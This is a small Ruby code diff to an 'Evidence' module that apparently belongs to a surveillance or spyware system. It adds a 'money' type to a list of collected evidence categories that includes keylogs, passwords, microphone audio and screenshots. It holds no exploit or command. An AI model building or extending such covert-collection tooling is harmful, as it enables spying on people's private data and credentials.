@@ -10,7 +10,7 @@ module Evidence
   extend RCS::Tracer
 
   TYPES = ["addressbook", "application", "calendar", "call", "camera", "chat", "clipboard", "device",
-           "file", "keylog", "position", "message", "mic", "mouse", "password", "print", "screenshot", "url"]
+           "file", "keylog", "message", "mic", "money", "mouse", "password", "position", "print", "screenshot", "url"]
 
   STAT_EXCLUSION = ['filesystem', 'info', 'command', 'ip']
 
